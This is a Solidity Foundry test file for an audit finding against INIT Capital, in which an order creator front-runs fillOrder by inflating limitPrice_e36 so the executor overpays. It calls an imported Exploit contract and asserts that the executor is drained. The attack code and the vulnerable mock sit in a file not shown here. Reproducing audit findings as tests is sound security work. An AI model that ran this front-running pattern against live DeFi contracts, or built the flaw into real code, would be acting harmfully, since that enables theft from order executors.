// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./30259-h-03-fillorder-executor-can-be-front-run-by-the-order-creato.sol";

/*//////////////////////////////////////////////////////////////
    INIT Capital — [H-03] fillOrder limitPrice_e36 front-run steals
    from executor. Finding #30259 (code4rena, said) — HIGH.
//////////////////////////////////////////////////////////////*/
contract LimitPriceFrontrunTest is Test {
    /// @notice CONTROL: with the fair limitPrice, amtOut equals the honest value.
    function test_control_fairLimitPrice_honestAmtOut() public {
        MockToken usdc = new MockToken("USDC");
        MockToken weth = new MockToken("WETH");
        MarginTradingHookVuln hook = new MarginTradingHookVuln();
        UserWallet creator = new UserWallet(hook);

        creator.openPos(1, address(weth), address(usdc), true, address(weth), 2e18, 1500e18);
        uint256 orderId = creator.createOrder(1, 1500e36, address(usdc), 1500e36, 1e18);
        assertEq(hook.previewAmtOut(orderId), 1500e18, "fair amtOut");
    }

    /// @notice HARM: creator inflates limitPrice before fill; executor pays 19x.
    function test_limitPrice_frontrun_stealsFromExecutor() public {
        Exploit exploit = new Exploit();
        exploit.run();

        assertEq(
            exploit.usdc().balanceOf(address(exploit.creator())),
            exploit.EVIL_AMT_OUT(),
            "creator received inflated amtOut"
        );
        assertEq(exploit.usdc().balanceOf(address(exploit.executor())), 0, "executor fully drained");
        assertGt(exploit.EVIL_AMT_OUT(), exploit.FAIR_AMT_OUT(), "inflated > fair");
    }
}
